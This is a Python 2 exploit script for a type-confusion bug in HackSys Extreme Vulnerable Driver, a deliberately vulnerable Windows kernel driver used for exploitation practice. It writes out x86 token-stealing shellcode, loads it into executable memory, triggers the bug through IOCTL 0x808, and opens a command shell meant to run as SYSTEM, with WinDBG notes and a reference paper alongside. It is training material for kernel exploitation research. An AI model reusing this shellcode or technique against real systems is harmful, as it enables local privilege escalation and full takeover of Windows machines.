# -*- coding: utf-8 -*-
from ctypes import *
import ctypes
import os
import struct
import subprocess
import sys


kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi
gdi32 = windll.gdi32
user32 = windll.user32


def debug_print(message):
    """ debug_debug_prints message in terminal and debugger """
    print(message)
    kernel32.OutputDebugStringA(message + "\n")


def hexdump(ptr, num):
    """
    Hexdump memory region - DEBUG
    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """
    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)

    return '\n'.join(lines)
    

def ctl_code(code):
    """ Recreate CTL_CODE macro to generate driver IOCTL """
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    return (
        (FILE_DEVICE_UNKNOWN << 16) |
        (FILE_ANY_ACCESS << 14) | 
        (code << 2) | 
        METHOD_NEITHER
    )

def _HANDLE_driver_connection():
    """ Create handle to driver """
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )

    return handle
        
    
def _ret_shellcode_buffer(shellcode):
    """ Payload memory allocation in user-land """
    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40
	
    ptr = kernel32.VirtualAlloc(
        c_int(0),                       # lpAddress
        c_int(len(shellcode)),          # dwSize
        c_int(MEM_COMMIT_MEM_RESERVE),  # flAllocationType
        c_int(PAGE_EXECUTE_READWRITE)   # flProtect
    )
    
    shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

    kernel32.RtlMoveMemory(
        c_int(ptr),
        shellcode_ptr,
        c_int(len(shellcode))
    )
        
    return ptr, len(shellcode)


def _send_payload(handle, payload_ptr, payload_len, code):
    """ Interacting with the driver """
    IO_CTL = kernel32.DeviceIoControl(
        handle,             # hDevice
        ctl_code(code),     # dwIoControlCode
        payload_ptr,        # lpInBuffer
        c_int(payload_len), # nInBufferSize
        None,               # lpOutBuffer
        0,                  # nOutBufferSize
        byref(c_ulong()),   # lpBytesReturned
        None                # lpOverlapped
    )
    
    return IO_CTL


def _ret_shellcode_x86():
    shellcode = bytearray(
        #---[Debug]
        #"\xCC"
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                          # popad		
        "\xC3"                          # ret
    )
    
    return shellcode


def _exploit(code):
    """ Execute exploit in order to get nt-authority/SYSTEM shell """

    # shellcode virtual_allocation()
    shellcode = _ret_shellcode_x86() 
    shellcode_ptr, shellcode_len = _ret_shellcode_buffer(shellcode)

    debug_print("\n[*] User-land shellcode allocated at: [0x%x]\n" % shellcode_ptr)
    debug_print(hexdump(shellcode_ptr, 32)) 

    payload = struct.pack("<L", 0x41414141)
    payload += struct.pack("<L", shellcode_ptr)
    """
    Breakpoint 8 hit
    HEVD!TypeConfusionObjectInitializer+0x2a:
    8cd22e30 ff5704          call    dword ptr [edi+4]
    1: kd> dps edi+4
    86c7b404  013f0000      => SHELLCODE_PTR
    86c7b408  04050002
    """

    payload_ptr = id(payload) + 0x14
    """
     python2.7 id() -> Commom issues and how to deal with it
    
     0: kd> dc 0x1760130
    .---------------------------------------------------------------.
    |01760130  00000001 6a7ae328 00000200 ffffffff  ....(ãzj....ÿÿÿÿ| -> Additional bytes when utilizing python id() function
    |                  .--------------------------------------------'
    |01760140  00000000|41414141 41414141 41414141  ....AAAAAAAAAAAA
    '------------------'
     01760150  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760160  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760170  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760180  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760190  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601a0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    ---------------------------------------------------------------
     0: kd> dc 0x1760130+0x14
     01760144  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760154  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760164  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760174  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA  -> Without additional bytes
     01760184  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760194  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601a4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601b4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     """
    
    debug_print("\n[!] payload_ptr: 0x%x" % payload_ptr)
    payload_len = len(payload)
    
    # driver file handler 
    hFile = _HANDLE_driver_connection()       
    debug_print("\n[+] Driver connection initilized!\n")
    raw_input("[*] Press any key to send payload...")

    # send custom payload -> junk + <shellcode_ptr> 
    _send_payload(
        hFile,
        payload_ptr,
        payload_len,
        code
    )

    debug_print("[+] Exploit Payload Sent!")
    debug_print("[!] Getting nt-authority/SYSTEM impersonated process shell...")
    
    os.system("cmd.exe /K") # get SYSTEM shell
    
if __name__ == "__main__":
    """
    https://www.exploit-db.com/docs/english/43880-hacksysteam-windows-kernel-vulnerable-driver-type-confusion-vulnerability-exploitation.pdf?rss
    
    IOCTL to trigger TypeConfusion in win7 x86
        http://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h

    Usefull WinDBG commands:
        .sympath c:\symbols;c:\hevd
        .reload /f *.*
        ed nt!Kd_Default_Mask 8
        .load pykd
        .load grep
        bp HEVD!TriggerTypeConfusion
        bp HEVD!TypeConfusionObjectInitializer+0x2a
        g
    """
    code = 0x808 # HEVD_IOCTL_TYPE_CONFUSION - IOCTL(0x808)
    _exploit(code)
